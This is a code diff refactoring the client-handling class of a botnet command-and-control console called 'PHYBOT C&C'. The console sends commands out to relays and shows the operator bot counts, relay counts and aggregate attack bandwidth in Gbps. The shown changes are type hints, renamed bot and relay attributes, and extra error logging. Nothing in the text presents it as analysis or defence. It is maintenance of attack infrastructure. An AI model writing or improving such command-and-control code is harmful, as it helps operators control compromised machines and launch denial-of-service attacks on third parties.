@@ -33,8 +33,8 @@ class Client():
         self,
         s: Sock,
         data: str,
-        escape=True,
-        reset=True,
+        escape: bool = True,
+        reset: bool = True,
     ) -> None:
         if reset: data += self.config.COLOR_RESET
         if escape: data += '\r\n'
@@ -47,10 +47,10 @@ class Client():
     ) -> None:
         self.log(f"send {data}")
 
-        for relay in self.config.relay_list.copy().keys():
+        for relay in self.config.relays_sock.copy().keys():
             try: self.send(relay, f'{data}', False, False)
             except Exception:
-                self.config.relay_list.pop(relay)
+                self.config.relays_sock.pop(relay)
                 relay.close()
 
     def prompt(
@@ -70,15 +70,17 @@ class Client():
     ):
         while 1:
             try:
-                bot_number: int = sum(self.config.bots)
-                relay_number: int = len(self.config.relay_list)
-                total_speed: int = sum(self.config.speed)/125000
+                bot_number: int = self.config.bot_count
+                relay_number: int = len(self.config.relays_sock)
+                total_speed: int = self.config.bot_speed/125000
                 actual_time: str = asctime(localtime())
                 self.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {bot_number}  |  Relay: {relay_number}  |  Speed: {total_speed} Gbps  |  {actual_time}\a', False)
 
                 sleep(self.config.cnc_time.UPTITLE)
 
-            except Exception: client.close()
+            except Exception as e:
+                client.close()
+                self.log(f"update_title error: {e}")
 
 
 
@@ -88,14 +90,13 @@ class Client():
         username: str,
     ):
         # send banner message
-        for x in self.config.banner.split('\n'):
-            self.send(client, x)
+        for banner_part in self.config.banner.split('\n'): self.send(client, banner_part)
 
         self.send(client, "\n")
 
-        bot_number: int = sum(self.config.bots)
-        relay_number: int = len(self.config.relay_list)
-        total_speed: int = sum(self.config.speed)/125000
+        bot_number: int = self.config.bot_count
+        relay_number: int = len(self.config.relays_sock)
+        total_speed: int = self.config.bot_speed/125000
 
         self.send(client, self.prompt(f"Bots: {bot_number}"))
         self.send(client, self.prompt(f"Relays: {relay_number}"))
